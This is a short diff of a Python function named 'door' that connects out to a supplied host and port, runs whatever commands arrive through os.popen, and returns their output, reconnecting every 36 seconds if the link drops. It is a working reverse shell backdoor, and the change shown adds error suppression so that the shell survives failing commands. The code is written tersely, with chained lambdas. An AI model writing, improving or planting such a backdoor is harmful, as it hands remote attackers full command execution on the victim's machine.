@@ -6,13 +6,17 @@ from socket import*
 def door(h, p):
     while 6:
         try:
+            def CE(F):
+                try: return F()
+                except:
+                    return
             C = socket(AF_INET, SOCK_STREAM)
             C.connect((h, int(p)))
             S, R = C.send, C.recv
             T = lambda I: I("utf-8")
             E = lambda I: T(I.encode)
             D = lambda I: T(I.decode)
-            while 6: S(E(os.popen(D(R(1024))).read()) or b"\xff")
+            while 6: S(CE(lambda: E(os.popen(D(R(1024))).read())) or b"\xff")
         except Exception:
             time.sleep(6*6)
 
